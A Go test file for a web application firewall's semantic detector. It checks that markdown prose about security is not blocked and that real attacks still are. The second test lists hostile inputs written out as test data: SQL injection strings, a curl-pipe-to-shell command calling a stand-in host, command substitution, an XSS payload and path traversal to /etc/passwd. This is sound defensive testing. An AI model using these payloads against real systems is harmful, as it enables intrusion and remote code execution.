package semantic

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

// markdownProseRequest builds a realistic "publish an article" request whose body
// carries markdown prose. This is the traffic shape a CMS, wiki, docs site, or
// blog sends on every save, and it is the surface where syntax-only evidence
// turns markdown punctuation into fake SQL/shell grammar.
func markdownProseRequest(t *testing.T, body string) *engine.RequestContext {
	t.Helper()
	encoded, err := json.Marshal(map[string]string{
		"title":   "security notes",
		"content": body,
	})
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest(http.MethodPost, "http://x/api/articles/publish", strings.NewReader(string(encoded)))
	req.Header.Set("Content-Type", "application/json")
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		t.Fatal(err)
	}
	return reqCtx
}

// TestMarkdownProseIsNotAnAttack pins the false-positive mechanism found by the
// mined security-prose probe (24.8% FP over 2000 samples). Each case is ordinary
// markdown with no executable primitive; every one must pass.
//
// The two dominant triggers being pinned:
//   - sqlComment matches "--", "#", "/*" and only requires the bare word
//     "or"/"union"/"select" elsewhere in the text, so "--flag ... or ..." and
//     "## heading ... or ..." both mint "syntax: SQL comment used to truncate
//     query" with semantics: none.
//   - rceShellControlEvidence treats any leftover single backtick as command
//     substitution, so markdown inline code (`site:`) mints "syntax: shell
//     control operator or command substitution" with semantics: none.
func TestMarkdownProseIsNotAnAttack(t *testing.T) {
	cases := []struct {
		name string
		body string
	}{
		{
			name: "inline-code-backticks",
			body: "The `site:` operator, when used with a target website, returns all content from the specified site that has been crawled and indexed.",
		},
		{
			name: "cli-flag-double-dash-plus-or",
			body: "The --random-agent option in sqlmap randomizes the HTTP User-Agent header, or you can pin one with --user-agent instead.",
		},
		{
			name: "markdown-heading-plus-or",
			body: "## 0x00 Introduction\n\nRemote desktop history matters during an assessment, or when reconstructing a timeline afterwards.",
		},
		{
			name: "markdown-horizontal-rule-and-bullets",
			body: "* * *\n\n- **ECMAScript** is the specification, or the standard, behind JavaScript and JScript.\n- Engines implement it independently.",
		},
		{
			name: "markdown-table-pipes",
			body: "| Tool | Purpose |\n| --- | --- |\n| id | print the current uid |\n| ls | list directory entries |",
		},
		{
			name: "fenced-shell-example",
			body: "To switch to the root user while keeping the current directory, run:\n\n```bash\nsu\n```\n\nThis preserves the working directory.",
		},
		{
			name: "prose-mentioning-primitives-without-using-them",
			body: "Attackers often chain union select against a vulnerable parameter, or read etc/passwd once they land a shell_exec primitive. Detecting the pattern is the point of this article.",
		},
		{
			name: "chinese-security-prose",
			body: "安全文本分析：\n\nSpring Boot 框架中包含了许多 actuators 功能，它可帮助开发人员在将 Web 应用程序投入生产时监视和管理应用，或用于排查线上故障。",
		},
	}

	analyzer := NewAnalyzer("block", 2)
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			reqCtx := markdownProseRequest(t, tc.body)
			got, err := analyzer.Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if got != nil && got.Detected {
				t.Fatalf("markdown prose must not be blocked\n  category=%s severity=%v confidence=%.3f\n  message=%q\n  payload=%q",
					got.Category, got.Severity, got.Confidence, got.Message, got.Payload)
			}
		})
	}
}

// TestRealAttacksStillBlockedInProseField is the other half of the guard. Any FP
// fix must not buy its clean prose score by going blind in the same field, so
// these carry genuine executable primitives and must all still be caught.
func TestRealAttacksStillBlockedInProseField(t *testing.T) {
	// want lists the acceptable categories. Some payloads legitimately carry two
	// primitives at once ("; cat /etc/passwd" is both a shell chain and a
	// sensitive-file read), and which one wins is a classification detail, not a
	// miss. The assertion that matters is that the request is still blocked.
	cases := []struct {
		name string
		body string
		want []string
	}{
		{"sqli-union-select", "1' UNION SELECT username, password FROM users-- ", []string{"sqli"}},
		{"sqli-tautology-comment", "admin' OR '1'='1'-- ", []string{"sqli"}},
		{"rce-semicolon-command", "x; cat /etc/passwd", []string{"rce", "lfi"}},
		{"rce-command-substitution", "$(curl http://evil.example/p | sh)", []string{"rce"}},
		{"rce-backtick-command", "report`whoami`", []string{"rce"}},
		{"xss-img-onerror", "<img src=x onerror=alert(1)>", []string{"xss"}},
		{"lfi-traversal", "../../../../etc/passwd", []string{"lfi"}},
	}

	analyzer := NewAnalyzer("block", 2)
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			reqCtx := markdownProseRequest(t, tc.body)
			got, err := analyzer.Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if got == nil || !got.Detected {
				t.Fatalf("real %v attack must still be detected, got %#v", tc.want, got)
			}
			matched := false
			for _, want := range tc.want {
				if got.Category == want {
					matched = true
					break
				}
			}
			if !matched {
				t.Fatalf("expected category in %v, got %s (message=%q)", tc.want, got.Category, got.Message)
			}
		})
	}
}
